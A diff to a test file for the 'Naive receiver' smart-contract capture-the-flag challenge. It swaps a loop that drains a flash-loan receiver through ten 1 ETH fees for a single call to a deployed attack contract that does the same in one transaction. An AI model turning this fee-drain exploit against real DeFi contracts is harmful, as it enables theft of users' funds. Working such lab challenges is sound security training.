@@ -54,15 +54,22 @@ describe('[Challenge] Naive receiver', function () {
          * The fee for the flashloan is 1 ETH, fixed
          * So doing it ten times in a loop => the flash receiver must pay 10 ETH
          */
-        const ETH = await pool.ETH();
-        for (let i=0; i < 10; i++) {
-            const data = await pool.flashLoan(
-                receiver.address,
-                ETH,
-                "0",
-                defaultAbiCoder.encode(["bytes calldata"], [defaultAbiCoder.encode(["bytes"], ["0x"])])
-            );
-        }
+        // const ETH = await pool.ETH();
+        // for (let i=0; i < 10; i++) {
+        //     const data = await pool.flashLoan(
+        //         receiver.address,
+        //         ETH,
+        //         "0",
+        //         defaultAbiCoder.encode(["bytes calldata"], [defaultAbiCoder.encode(["bytes"], ["0x"])])
+        //     );
+        // }
+
+        /** Bonus level - drain contract in a single tx
+         * Single call to a contract, which in-turn calls the flashLoan 10 times.
+         */
+        const BonusFlashLoanAttack = await ethers.getContractFactory('BonusAttackNaiveReceiver', player);
+        const attacker = await BonusFlashLoanAttack.deploy(pool.address, receiver.address);
+        await attacker.attack();
     });
 
     after(async function () {
